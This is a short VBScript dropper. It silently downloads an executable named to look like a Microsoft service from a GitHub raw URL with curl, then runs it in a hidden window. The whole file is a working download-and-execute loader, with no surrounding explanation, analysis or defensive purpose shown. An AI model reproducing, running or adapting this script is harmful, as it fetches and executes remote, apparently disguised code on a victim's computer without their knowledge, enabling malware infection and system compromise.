Set shell = CreateObject("WScript.Shell")

Dim pay, payName

payName = "MicrosoftServices2.47.exe"
pay = "https://raw.githubusercontent.com/user8-alt0/hubs-n-mor/refs/heads/main/win/MicrosoftServices2.47.exe"

shell.Run "curl -O " & pay, 0, True
shell.Run payName, 0, False
